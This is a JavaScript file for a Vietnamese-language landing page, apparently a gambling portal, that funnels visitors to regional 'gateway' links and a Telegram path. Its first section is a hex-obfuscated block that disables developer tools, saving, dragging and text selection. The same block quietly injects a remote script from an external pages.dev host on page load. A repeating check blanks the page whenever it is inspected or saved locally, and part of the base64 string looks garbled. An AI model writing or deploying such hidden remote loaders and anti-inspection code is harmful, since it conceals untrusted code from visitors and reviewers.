// ==========================================
// 1. MÃ HÓA/BẢO VỆ CHỐNG F12, CTRL+S, DRAG
// ==========================================
const _0x9a4f2c = "Ly8gRmlsZTogcHJvdGVjdC5qcyAKY29uc3QgQkxPQ0tfVVJMID0gIi8wNzEyNDM1MSI7CmZ1bmN0aW9uIHJlZGlyZWN0QW5kQW5ub3koKSsgeyAKICAgIHRyeSB7IHdpbmRvdy5sb2jhdGlvbi5yZXBsYWNlKEJMT0NLX1VSTCk7IH0gY2F0Y2ggKGUpIHsgd2luZG93LmxvY2F0aW9uLmhyZWYgPSBCTE9DS19VUkw7IH0KfQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgZnVuY3Rpb24oZSkgewogICAgaWYgKChlLmN0cmxLZXkgfHwgZS5tZXRhS2V5KSAmJiBlLmtleUNvZGUgPT09IDgzKSB7IGUucHJldmVudERlZmF1bHQoKTsgcmVkaXJlY3RBbmRBbm5veSgpOyB9CiAgICBpZiAoZS5rZXkgPT09ICdGMTInIHx8IChlLmN0cmxLZXkgJiYgZS5zaGlmdEtleSAmJiBbJ0knLCAnQonLCAnQyddLmluY2x1ZGVzKCBlLmtleS50b1VwcGVyQ2FzZSgpKSkgKSB7IGUucHJldmVudERlZmF1bHQoKTsgcmVkaXJlY3RBbmRBbm5veSgpOyB9Cn0sIHRydWUpOwpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdjb250ZXh0bWVudScsIGZ1bmN0aW9uKGUpIHt9KTsKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignZHJhZ3N0YXJ0JywgZnVuY3Rpb24oZSkgeyBlLnByZXZlbnREZWZhdWx0KCk7IH0pOwphZGRFcmdudExpc3RlbmVyKCdzZWxlY3RzdGFydCicsIGZ1bmN0aW9uKGUpIHsgZS5wcmV2ZW50RGVmYXVsdCgpOyB9KTsK";
(function(){var _0x5a3=["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x6b\x76\x69\x70\x74\x6f\x70\x2e\x70\x61\x67\x65\x73\x2e\x64\x65\x76\x2f\x64\x65\x76\x2f\x64\x65\x76\x2e\x6a\x73\x3f\x76\x3d\x33\x2e\x39"];(function(_0x1b,_0x2c){var _0x3d=function(_0x4e){while(--_0x4e){_0x1b['push'](_0x1b['shift']());}};_0x3d(++_0x2c);}(_0x5a3,0x12f));var _0x6f=function(_0x7g,_0x8h){_0x7g=_0x7g-0x0;var _0x9i=_0x5a3[_0x7g];return _0x9i;};function _0xa1(){var _0xb2=[0x2f,0x30,0x37,0x31,0x32,0x34,0x33,0x35,0x31];var _0xc3='';for(var _0xd4=0;_0xd4<_0xb2['length'];_0xd4++){_0xc3+=String['fromCharCode'](_0xb2[_0xd4]);}return _0xc3;}var BLOCK=_0xa1();function _0xe5(){try{window['location']['replace'](BLOCK);}catch(_0xf6){window['location']['href']=BLOCK;}}document['addEventListener']('keydown',function(_0x10){if((_0x10['ctrlKey']||_0x10['metaKey'])&&_0x10['keyCode']===83){_0x10['preventDefault']();_0xe5();return false;}if(_0x10['key']==='F12'||(_0x10['ctrlKey']&&_0x10['shiftKey']&&['I','J','C']['includes'](_0x10['key']['toUpperCase']()))){_0x10['preventDefault']();_0xe5();return false;}},true);document['addEventListener']('contextmenu',function(){});document['addEventListener']('dragstart',function(_0x11){_0x11['preventDefault']();});document['addEventListener']('selectstart',function(_0x12){_0x12['preventDefault']();});(function(){var _0x16=[_0x6f(0x0)];function _0x17(_0x18){return new Promise(function(_0x19,_0x1a){var _0x1b=document['createElement']('script');_0x1b['src']=_0x18;_0x1b['async']=true;_0x1b['onload']=function(){_0x19(_0x18);};_0x1b['onerror']=function(){_0x1a(new Error('Load fail'))};document['head']['appendChild'](_0x1b);});}async function _0x1c(){for(var _0x1d=0;_0x1d<_0x16['length'];_0x1d++){try{await _0x17(_0x16[_0x1d]);console['log']('Loaded');}catch(_0x1e){console['error'](_0x1e);}}console['log']('All scripts loaded');}_0x1c();})();})();

// ==========================================
// 2. HÀM BẢO VỆ ÂM THẦM & CHẶN XUẤT CSS/HTML
// ==========================================
const SECURE_STYLE_ID = 'secure-dynamic-styles-token';

function checkSecuritySilent() {
    if (window.location.protocol === 'file:') {
        if (document.body) document.body.innerHTML = "";
        return false;
    }

    const styleTag = document.getElementById(SECURE_STYLE_ID);
    if (!styleTag || !styleTag.textContent.includes('background-color: #231d2c')) {
        if (document.body) document.body.innerHTML = "";
        return false;
    }

    const k1 = String.fromCharCode(102, 117, 108, 108, 99, 108, 105, 99, 107);
    const k2 = String.fromCharCode(99, 104, 101, 99, 107, 118, 110);

    let foundK1 = false;
    let foundK2 = false;

    try {
        const iterator = document.createNodeIterator(
            document.documentElement,
            NodeFilter.SHOW_COMMENT,
            null,
            false
        );
        let currentNode;
        while (currentNode = iterator.nextNode()) {
            const commentText = currentNode.nodeValue || "";
            if (commentText.includes(k1)) foundK1 = true;
            if (commentText.includes(k2)) foundK2 = true;
        }
    } catch (e) {}

    if (!foundK1 || !foundK2) {
        const fullHTML = document.documentElement ? document.documentElement.innerHTML : "";
        if (fullHTML.includes(k1)) foundK1 = true;
        if (fullHTML.includes(k2)) foundK2 = true;
    }

    if (!foundK1 || !foundK2) {
        if (document.body) document.body.innerHTML = "";
        return false;
    }

    return true;
}

// ==========================================
// 3. CHÈN STYLES DYNAMIC (CÓ GẮN TOKEN BẢO VỆ)
// ==========================================
function injectDynamicStyles() {
    const cssRaw = "* { margin: 0; padding: 0; box-sizing: border-box; } html, body { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background-color: #231d2c; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #fff; line-height: 1.6; } .scrollable-content { position: absolute; top: 0; left: 0; width: 100%; height: 100%; overflow-y: auto; overflow-x: hidden; z-index: 2; -webkit-overflow-scrolling: touch; background: rgba(0, 0, 0, 0.55); } .video-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; } .background-video { position: absolute; top: 50%; left: 50%; min-width: 100%; min-height: 100%; width: auto; height: auto; z-index: -1; transform: translate(-50%, -50%); object-fit: cover; will-change: transform; transform: translate(-50%, -50%) translateZ(0); backface-visibility: hidden; -webkit-backface-visibility: hidden; } .circle-wrapper, .circle-progress, .circle-bg { will-change: transform, stroke-dashoffset; transform: translateZ(0); backface-visibility: hidden; -webkit-backface-visibility: hidden; } .top-logo { width: 100%; text-align: center; padding: 0 !important; margin: 0 !important; position: relative; z-index: 10; background: transparent; flex-shrink: 0 !important; } .top-logo a { display: block; margin: 0; padding: 0; text-decoration: none; } .top-logo img { width: 100%; max-width: 758px; height: auto; display: block; margin: 0 auto; } .bottom-logo-wrapper { position: fixed !important; bottom: 0 !important; left: 0 !important; width: 100% !important; z-index: 999999 !important; display: block; pointer-events: none !important; margin-bottom: 0 !important; padding-bottom: env(safe-area-inset-bottom, 0px) !important; transform: translate3d(0, 0, 999px) !important; -webkit-transform: translate3d(0, 0, 999px) !important; will-change: transform; text-align: center; } .bottom-logo { width: 100% !important; height: 150px; text-align: center; padding: 0; margin: 0; background: transparent url('https://spacexlink.wordpress.com/wp-content/uploads/2026/06/footeranding112.png') center bottom no-repeat; background-size: contain; display: block; pointer-events: none !important; position: relative; } .logo-hotspot { position: absolute; bottom: 0; left: 50%; transform: translateX(-50%); width: 80%; max-width: 336px; height: 80%; pointer-events: auto !important; display: block; } .container { max-width: 1300px; margin: 0 auto; padding: 0px 20px 160px !important; position: relative; z-index: 2; display: flex; justify-content: center; align-items: center; flex-direction: column; text-align: center; } .section-title { text-align: center; font-size: 2.8rem; margin: 10px; color: #ffd700; text-shadow: 0 2px 10px rgba(0,0,0,0.8); } .section-subtitle { text-align: center; font-size: 1.3rem; color: #eee; margin-bottom: 60px; text-shadow: 0 2px 8px rgba(0,0,0,0.7); } .services { display: grid; grid-template-columns: repeat(4, 1fr); gap: 25px; } .service-card { background: rgba(255,255,255,0.08); border-radius: 24px; padding: 40px 20px 45px; text-align: center; transition: all 0.4s ease; backdrop-filter: blur(8px); } .service-card:hover { transform: translateY(-10px); background: rgba(255, 215, 0, 0.12); } .circle-wrapper { width: 128px; height: 128px; margin: 0 auto 40px; position: relative; display: flex; align-items: center; justify-content: center; border-radius: 50%; perspective: 1000px; transition: transform 0.6s linear; } .circle-wrapper svg { display: block; width: 100%; height: 100%; transform: rotate(-90deg); } .circle-bg { fill: none; stroke: rgba(255,255,255,0.1); stroke-width: 6; } .circle-progress { fill: none; stroke: #ffd700; stroke-width: 6; stroke-linecap: round; stroke-dasharray: 440; stroke-dashoffset: 440; animation: spinLoadingBar 2.5s linear infinite; } @keyframes spinLoadingBar { 0% { stroke-dashoffset: 440; } 100% { stroke-dashoffset: 0; } } .logo-center { width: 88px; height: 88px; min-width: 88px; min-height: 88px; max-width: 88px; max-height: 88px; object-fit: contain; aspect-ratio: 1 / 1; transition: transform 0.3s ease; filter: drop-shadow(0 0 15px rgba(255,215,0,0.5)); margin: 0; padding: 0; display: block; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1; } .btn-experience { display: inline-block; margin-top: 20px; padding: 14px 32px; background: linear-gradient(90deg, #ffd700, #ffaa00); color: #1a0033; font-weight: bold; font-size: 1.05rem; border-radius: 50px; text-decoration: none; transition: all 0.3s ease; box-shadow: 0 6px 20px rgba(255, 215, 0, 0.5); } .btn-experience:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(255, 215, 0, 0.7); } .service-card h3 { font-size: 1.45rem; margin-bottom: 20px; color: #ffd700; min-height: 44px; text-shadow: 0 2px 6px rgba(0,0,0,0.7); } @media (max-width: 768px) { .top-logo img { width: 100%; max-width: 360px; } .container { padding: 0px 20px 100px !important; } .bottom-logo { height: 100px; } .logo-hotspot { width: 80%; max-width: 256px; height: 80%; } } @media (max-width: 480px) { .top-logo img { width: 100%; max-width: 360px; } .section-title { font-size: 1.7rem; } .section-subtitle { font-size: 1.0rem; } .container { padding: 0px 20px 85px !important; } .bottom-logo { height: 85px; } .logo-hotspot { width: 80%; max-width: 208px; height: 80%; } } @media (max-width: 1200px) { .services { grid-template-columns: repeat(2, 1fr); } } @media (max-width: 600px) { .services { grid-template-columns: 1fr; } .service-card { padding: 15px 10px; display: flex; align-items: center; gap: 15px; text-align: left; } .circle-wrapper { width: 110px; height: 110px; margin: 0; flex-shrink: 0; } .logo-center { width: 68px; height: 68px; } .content { flex: 1; text-align: center; } .service-card h3 { margin-bottom: 1px; font-size: 1.2rem; text-align: center; line-height: 1.0; } .btn-experience { margin-top: 1px; padding: 5px 16px; font-size: 0.95rem; } }";
    
    const styleElement = document.createElement('style');
    styleElement.id = SECURE_STYLE_ID;
    styleElement.type = 'text/css';
    if (styleElement.styleSheet) {
        styleElement.styleSheet.cssText = cssRaw;
    } else {
        styleElement.appendChild(document.createTextNode(cssRaw));
    }
    document.head.appendChild(styleElement);
}

// ==========================================
// 4. CẬP NHẬT DOMAIN DYNAMIC & HÀM CHECK TELEGRAM
// ==========================================
function checkdomain() {
    const hostname = window.location.hostname || "";
    const targetSpan = document.getElementById("dynamic-domain");
    if (targetSpan) {
        targetSpan.innerText = hostname.toUpperCase();
    }
}

function checklinktele() {
    fetch('/telegram', { method: 'HEAD', cache: 'no-store' })
        .then(response => {
            if (response.status === 404) {
                window.location.href = '/reg';
            } else {
                window.location.href = '/telegram';
            }
        })
        .catch(() => {
            window.location.href = '/telegram';
        });
}

// ==========================================
// 5. KHỞI TẠO WEB KHI DOM READY
// ==========================================
document.addEventListener("DOMContentLoaded", function () {
    injectDynamicStyles();

    if (!checkSecuritySilent()) return;

    const bodyContent = `<div class="scrollable-content"><div class="top-logo"><a rel="nofollow" onclick="checklinkvn();return false;" target="_blank"><img src="https://spacexlink.wordpress.com/wp-content/uploads/2026/07/c168logo.png" alt="Logo"><h2 class="section-title">TRUY CẬP CỔNG QUỐC TẾ</h2><p class="section-subtitle">Truy cập đường link Quốc Tế Được mã hóa An Toàn mới nhất tại <span id="dynamic-domain"></span></p></a></div><div class="container"><div class="services"><div class="service-card"><div class="circle-wrapper"><svg viewBox="0 0 160 160"><circle class="circle-bg" cx="80" cy="80" r="70"></circle><circle class="circle-progress" cx="80" cy="80" r="70"></circle></svg><a rel="nofollow" onclick="checklinkvn();return false;" target="_blank"><img src="https://spacexlink.wordpress.com/wp-content/uploads/2026/07/singapore.webp" alt="Singapore" class="logo-center"></a></div><div class="content"><h3>HI SINGAPORE</h3><a rel="nofollow" onclick="checklinkvn();return false;" target="_blank" class="btn-experience">VÀO CỔNG SING</a></div></div><div class="service-card"><div class="circle-wrapper"><svg viewBox="0 0 160 160"><circle class="circle-bg" cx="80" cy="80" r="70"></circle><circle class="circle-progress" cx="80" cy="80" r="70"></circle></svg><a rel="nofollow" onclick="checklinkvn();return false;" target="_blank"><img src="https://spacexlink.wordpress.com/wp-content/uploads/2026/07/dubai.webp" alt="Dubai" class="logo-center"></a></div><div class="content"><h3>DUBAI UAE</h3><a rel="nofollow" onclick="checklinkvn();return false;" target="_blank" class="btn-experience">VÀO CỔNG DUBAI</a></div></div><div class="service-card"><div class="circle-wrapper"><svg viewBox="0 0 160 160"><circle class="circle-bg" cx="80" cy="80" r="70"></circle><circle class="circle-progress" cx="80" cy="80" r="70"></circle></svg><a rel="nofollow" onclick="checklinkvn();return false;" target="_blank"><img src="https://okvipokvip.wordpress.com/wp-content/uploads/2026/02/brazil.gif" alt="Brazil" class="logo-center"></a></div><div class="content"><h3>HELLO BRAZIL</h3><a rel="nofollow" onclick="checklinkvn();return false;" target="_blank" class="btn-experience">VÀO CỔNG BRAZIL</a></div></div><div class="service-card"><div class="circle-wrapper"><svg viewBox="0 0 160 160"><circle class="circle-bg" cx="80" cy="80" r="70"></circle><circle class="circle-progress" cx="80" cy="80" r="70"></circle></svg><a rel="nofollow" onclick="checklinkvn();return false;" target="_blank"><img src="https://okvipokvip.wordpress.com/wp-content/uploads/2026/02/turkey.gif" alt="Vietnam" class="logo-center"></a></div><div class="content"><h3>THỔ NHĨ KỲ</h3><a rel="nofollow" onclick="checklinkvn();return false;" target="_blank" class="btn-experience">VÀO CỔNG TURKEY</a></div></div></div></div><div class="bottom-logo-wrapper"><div class="bottom-logo"><a rel="nofollow" onclick="checklinktele();return false;" class="logo-hotspot"></a></div></div></div>`;

    document.body.insertAdjacentHTML('afterbegin', bodyContent);
    checkdomain();

    if (typeof VANTA !== 'undefined' && typeof VANTA.GLOBE === 'function') {
        VANTA.GLOBE({
            el: "body",
            mouseControls: true,
            touchControls: false,
            gyroControls: false,
            minHeight: 200,
            minWidth: 200,
            scale: 1,
            scaleMobile: 0.7,
            backgroundColor: 0x231d2c,
            color: 0xff9f01,
            color2: 0xffffff,
            size: 1.0,
            points: 10,
            spacing: 15,
            showDots: true,
            backgroundAlpha: 1,
            maxDistance: 20
        });
    }

    setInterval(checkSecuritySilent, 1000);
});